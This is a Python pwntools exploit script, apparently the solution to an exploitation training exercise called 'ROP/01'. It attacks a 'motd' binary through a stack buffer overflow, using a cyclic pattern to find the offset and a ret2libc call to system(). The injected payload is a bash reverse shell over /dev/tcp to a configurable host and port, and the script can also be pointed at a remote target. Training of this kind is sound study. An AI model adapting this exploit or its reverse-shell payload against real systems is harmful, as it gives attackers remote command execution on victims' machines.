#!/usr/bin/env python
from pwn import *
from struct import pack
def q(addr): return pack('<Q', addr)

print "=== ROP/01: Solution ===\n"
"""
Explanation:
    TODO
"""

REMOTE = False              # TARGET is ip:port
TARGET = '../bin/motd_v0.1' # Binary path (local)
LHOST  = "127.0.0.1"        # Reverse shell host
LPORT  = "8889"             # Reverse shell port
DEBUG  = False              # Follow along in GDB

PATTERN_ONLY = False        # Do not exploit: Send the pattern to determine offset instead of payload.

# pattern_create.rb -l 1000
PATTERN = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B"

# pattern_offset -l 1000 -q 0x6a41396941386941
OFFSET = 264         # [*] Exact match at offset 264
SYSTEM = q(0x409240) # readelf -s chal1 | grep system


if PATTERN_ONLY:
    PAYLOAD = PATTERN
else:
    # Store payload on stack. it can't be directly executed though due to NX
    PAYLOAD = "bash -i >& /dev/tcp/{}/{} 0>&1\x00".format(LHOST, LPORT)
    # First A to fix alignment because rdi points to rsp+1
    PAYLOAD = "A" + PAYLOAD + "A" * (OFFSET - len(PAYLOAD) - 1)
    # Directly call libc's system()
    PAYLOAD += SYSTEM # ret2libc

if not DEBUG:
    p = process(TARGET) if not REMOTE else remote(TARGET)
else: # Follow along in gdb
    p = gdb.debug(TARGET, '''
        set follow-fork-mode parent
        break *0x00401efa
        continue
    ''')

# Set motd
p.sendline("2")
p.sendline(PAYLOAD)
print p.readall()
